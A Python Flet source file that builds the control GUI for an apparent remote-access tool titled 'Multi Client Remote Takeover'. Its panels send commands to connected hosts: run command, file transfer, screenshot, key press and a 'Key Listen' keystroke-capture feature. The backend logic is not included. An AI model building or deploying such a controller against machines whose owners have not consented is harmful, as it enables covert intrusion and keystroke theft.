import flet as ft
from frontend import controls
from backend.client_management import ClientManagement
from backend.client import Client
from backend.commands.FileTransfer import sender, receiver
from backend.commands.screenshot import master_receive

class Page:
    page: ft.Page
    panel: ft.Row

    commands: list[controls.CommandPanel]
    command_grid: ft.ResponsiveRow

    host_list: controls.HostList

    console: controls.Console

    client_management: ClientManagement
    current_client: Client | None

    def __init__(self):
        self.page: ft.Page | None = None
        self.panel: ft.Row | None = None

        self.commands = [controls.FileTransferCommandPanel(send_request=self.send_file_transfer_request),
                         controls.CommandPanel(icon=ft.Icons.TERMINAL, name="Run Command", uri="run_command", fields={"command": "command"}, send_request=self.send_request), # parameter_name: title
                         controls.CommandPanel(icon=ft.Icons.SCREENSHOT_MONITOR, name="Screenshot", uri="screenshot", fields={"destination_path": "destination path", "file_name": "name"}, send_request=self.send_screenshot_request),
                         controls.CommandPanel(icon=ft.Icons.KEYBOARD, name="Key Press", uri="key_press", fields={"keys_str": "key_list (separate with space)"}, send_request=self.send_request),
                         controls.CommandPanel(icon=ft.Icons.HEARING_ROUNDED, name="Key Listen", uri="key_listen", fields={"timeout": "timeout"}, send_request=self.send_request)]
        self.command_grid = ft.ResponsiveRow(columns=12, spacing=10, controls=self.commands, expand=True)

        self.host_list = controls.HostList(select_client=self.select_client)

        self.console = controls.Console()
        self.console.set_text("TEST\n\n\n\n\n\n\nTEST\n\n\n\n\n\n\nTEST")

        self.client_management = ClientManagement(ip="192.168.1.207", port=8080, add_to_frontend=self.add_client)
        self.current_client = None

        ft.run(main=self.main)


    async def main(self, page: ft.Page):
        self.page: ft.Page = page
        self.page.title = "Multi Client Remote Takeover"
        self.page.vertical_alignment = ft.MainAxisAlignment.START
        self.page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
        self.panel = ft.Row(alignment=ft.MainAxisAlignment.START, vertical_alignment=ft.CrossAxisAlignment.START,
                               expand=True)

        self.panel.controls.extend([ft.Container(content=self.host_list, bgcolor="#1c52a3"),
                                    ft.Column(controls=[self.command_grid, self.console], expand=True)])



        self.page.add(self.panel)

    def select_client(self, ip: str):
        self.current_client = self.client_management.get_client(ip)

    def send_request(self, uri: str, parameters: dict):
        if self.current_client is None:
            return # update GUI
        response = self.current_client.send_request(uri=uri, parameters=parameters)
        self.console.set_text(response.body)

    def send_file_transfer_request(self, uri:str, parameters: dict):
        if self.current_client is None:
            return # update GUI
        if uri == "receive":
            response = sender.master_send(host=self.current_client, **parameters)
        else:
            response = receiver.master_receive(host=self.current_client, **parameters)

        self.console.set_text(response.body)

    def send_screenshot_request(self, uri: str, parameters: dict):
        if self.current_client is None:
            return # update GUI
        response = master_receive(host=self.current_client, **parameters)
        self.console.set_text(response.body)

    def add_client(self, ip: str, port: int):
        self.host_list.add(ip=ip, port=port)
        self.page.update()